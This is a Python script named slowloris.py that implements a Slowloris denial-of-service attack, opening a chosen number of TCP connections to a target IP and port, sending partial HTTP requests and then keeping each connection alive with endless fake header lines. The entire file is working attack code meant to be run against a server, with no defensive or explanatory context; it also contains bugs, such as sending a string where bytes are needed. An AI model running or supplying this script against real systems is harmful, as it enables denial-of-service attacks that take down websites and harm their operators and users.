import socket
import random
import sys

sockets = []

def create_socket(IP, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4) # maybe this line can be removed or set really high idk yet
    s.connect((IP, port))
    s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n".encode())
    return s

def slowloris(IP, port, socket_count):

    # TODO use argv to pass in IP and port and socket count
    
    while True:

        # Make sure there are still socket_count sockets
        for i in range(socket_count - len(sockets)):
            try:
                s = create_socket(IP, port)
                sockets.append(s)
            except:
                print("socket could not be established")
                break

        for s in sockets:
            try:
                s.send(f"X-a {random.randint(1,255)}\r\n")
            except:
                sockets.remove(s)

if __name__ == "__main__":

    args = sys.argv

    if len(args) != 4:
        print("Invalid Usage")
        print("Usage: python slowloris.py <IP> <Port> <Socket Count>")
        sys.exit(1)

    try:
        IP = args[1]
        port = int(args[2])
        socket_count = int(args[3])
    except:
        print("Invalid Usage")
        print("Usage: python slowloris.py <IP> <Port> <Socket Count>")
        sys.exit(1)
        
    slowloris(IP, port, socket_count)
